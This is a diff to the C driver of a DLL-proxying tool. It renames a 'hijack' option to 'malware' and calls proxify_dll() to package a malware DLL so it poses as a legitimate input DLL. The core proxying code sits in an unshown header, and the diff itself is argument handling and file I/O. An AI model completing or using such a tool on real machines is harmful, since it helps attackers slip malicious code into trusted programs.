@@ -17,6 +17,8 @@
 #include <stdlib.h>
 #include <unistd.h>
 
+#include "pdl.h"
+
 #define MAP_SIZE (16 * 1024 * 1024)
 
 //
@@ -33,7 +35,7 @@
 
 void *create_file_memory_map(char *file, int add_size) {
   FILE *fp1;
-  if (fp1 = fopen(file, "rb")) {
+  if ((fp1 = fopen(file, "rb")) != NULL) {
     fseek(fp1, 0, SEEK_END);
     int size = ftell(fp1);
     void *ptr = malloc(size + add_size);
@@ -56,7 +58,7 @@ void discart_file_memory_map(void *ptr) { free(ptr); }
 
 void write_file_memory_map(char *file, void *ptr, int size) {
   FILE *fp1;
-  if (fp1 = fopen(file, "wb")) {
+  if ((fp1 = fopen(file, "wb")) != NULL) {
     fwrite(ptr, 1, size, fp1);
     fclose(fp1);
   } else {
@@ -83,11 +85,11 @@ int main(int argc, char **argv) {
   bool debug = false;
   char *input = NULL;
   char *output = NULL;
-  char *hijack = NULL;
+  char *malware = NULL;
 
   // parse command-line
   int c;
-  while ((c = getopt(argc, argv, "vi:o:h:")) != -1)
+  while ((c = getopt(argc, argv, "vi:o:m:")) != -1)
     switch (c) {
     case 'v':
       debug = true;
@@ -98,14 +100,14 @@ int main(int argc, char **argv) {
     case 'o':
       output = optarg;
       break;
-    case 'h':
-      hijack = optarg;
+    case 'm':
+      malware = optarg;
       break;
     }
 
   // check command-line
-  if ((input == NULL) || (output == NULL) || (hijack == NULL)) {
-    printf("Usage: %s [-i input_dll] [-o output_dll] [-h hijack_dll]\n",
+  if ((input == NULL) || (output == NULL) || (malware == NULL)) {
+    printf("Usage: %s [-i input_dll] [-o output_dll] [-m malware_dll]\n",
            argv[0]);
     exit(EXIT_FAILURE);
   }
@@ -114,7 +116,7 @@ int main(int argc, char **argv) {
   if (debug) {
     printf("* INPUT DLL: %s\n", input);
     printf("* OUTPUT DLL: %s\n", output);
-    printf("* HIJACK DLL: %s\n", hijack);
+    printf("* MALWARE DLL: %s\n", malware);
   }
 
   // check provided files
@@ -126,8 +128,8 @@ int main(int argc, char **argv) {
     printf("error output_dll already exists\n");
     exit(EXIT_FAILURE);
   }
-  if (access(hijack, F_OK) != 0) {
-    printf("error hijack_dll dont exists\n");
+  if (access(malware, F_OK) != 0) {
+    printf("error malware_dll dont exists\n");
     exit(EXIT_FAILURE);
   }
 
@@ -137,18 +139,25 @@ int main(int argc, char **argv) {
     printf("error mapping input_dll\n");
     exit(EXIT_FAILURE);
   }
-  void *hijack_ptr;
-  if ((hijack_ptr = create_file_memory_map(hijack, MAP_SIZE)) == NULL) {
-    printf("error mapping hijack_dll\n");
+  void *malware_ptr;
+  if ((malware_ptr = create_file_memory_map(malware, MAP_SIZE)) == NULL) {
+    printf("error mapping malware_dll\n");
     exit(EXIT_FAILURE);
   }
 
-  //###
-  int new_hijack_size = 1024;
+  // process
+  int new_malware_size =
+      proxify_dll(malware_ptr, input_ptr, (debug ? PDL_FLAG_DEBUG : 0));
+
+  //check success
+  if (new_malware_size == 0) {
+    printf("error proxyfing dll\n");
+    exit(EXIT_FAILURE);
+  }
 
   // close maps
   discart_file_memory_map(input_ptr);
-  write_file_memory_map(output, hijack_ptr, new_hijack_size);
+  write_file_memory_map(output, malware_ptr, new_malware_size);
 
   printf("success!\n");
   exit(EXIT_SUCCESS);
